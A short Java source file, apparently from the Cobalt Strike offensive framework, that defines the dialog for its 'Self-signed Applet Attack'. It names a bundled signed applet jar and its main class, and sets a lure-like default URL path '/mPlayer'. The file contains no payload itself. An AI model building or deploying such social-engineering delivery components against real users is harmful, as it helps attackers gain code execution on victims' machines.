package aggressor.dialogs;

import aggressor.AggressorClient;

import java.util.Stack;

public class JavaSignedAppletDialog
        extends JavaAppletDialog {
    public JavaSignedAppletDialog(AggressorClient client) {
        super(client);
    }

    @Override
    public String getResourceName() {
        String override = this.client.getScriptEngine().format("SIGNED_APPLET_RESOURCE", new Stack());
        if (override != null) {
            return override;
        }
        return "resources/applet_signed.jar";
    }

    @Override
    public String getMainClass() {
        String override = this.client.getScriptEngine().format("SIGNED_APPLET_MAINCLASS", new Stack());
        if (override != null) {
            return override;
        }
        return "Java.class";
    }

    @Override
    public String getShortDescription() {
        return "signed applet";
    }

    @Override
    public String getTitle() {
        return "Self-signed Applet Attack";
    }

    @Override
    public String getURL() {
        return "https://www.cobaltstrike.com/help-java-signed-applet-attack";
    }

    @Override
    public String getDescription() {
        return "This package sets up a self-signed Java applet. This package will spawn the specified listener if the user gives the applet permission to run.";
    }

    @Override
    public String getDefaultURL() {
        return "/mPlayer";
    }
}

